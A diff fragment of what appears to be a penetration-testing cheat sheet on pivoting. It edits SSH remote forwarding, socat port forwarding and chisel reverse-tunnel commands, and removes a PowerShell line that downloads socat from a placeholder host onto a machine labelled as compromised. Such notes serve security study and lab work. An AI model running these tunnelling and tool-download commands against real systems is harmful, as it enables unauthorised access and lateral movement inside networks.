@@ -12,14 +12,13 @@ ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
 
 ### Socat - Port Forward
 ```
-powershell -c "wget http://ip:port/socat -Outfile socat"  
-./socat.exe TCP-LISTEN:8002,fork,reuseaddr TCP:192.168.0.20:8080
+./socat.exe TCP-LISTEN:8002,fork,reuseaddr TCP:127.0.0.1:8080
 ```
 
 ### chisel  - Remote Port Forward 
 -> Your machine  
 ```
-./chisel server -p LISTEN_PORT --reverse &
+./chisel server -p <LISTEN_PORT> --reverse &
 ```
 
 -> Compromised Host
